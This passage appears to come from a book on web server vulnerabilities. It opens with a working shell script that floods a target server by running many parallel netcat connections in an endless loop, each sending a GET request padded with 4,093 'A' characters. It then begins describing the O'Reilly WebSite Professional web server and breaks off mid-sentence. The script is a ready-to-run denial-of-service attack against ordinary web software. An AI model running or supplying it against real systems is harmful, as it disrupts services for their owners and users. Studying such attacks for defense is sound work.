```
DUZOA=`perl -e '{ print "A"x4093 }`\
MAX=30

while :; do
    ILE=0
    while [ $ILE -lt $MAX ]; do
    (
        (
        echo "GET /"
        echo $DUZOA
        echo
        ) | nc $SERVER $PORT &
        sleep $WAIT
        kill -9 $!
    ) &>/dev/null &
    ILE=$[ILE+1]
    done
    sleep $WAIT
done
```

# O’Reilly WebSite Professional

Rated as one of the fastest-growing personal and corporate Internet server daemons, WebSite Professional (http://website.oreilly.com) is among the most robust Web servers on the market (see Figure 9.10). With custom CGI and Perl support, plus VBScript, JavaScript, Python, and Microsoft ASPA scripting standardization, this suite is unmatched in ease of use and programmability. With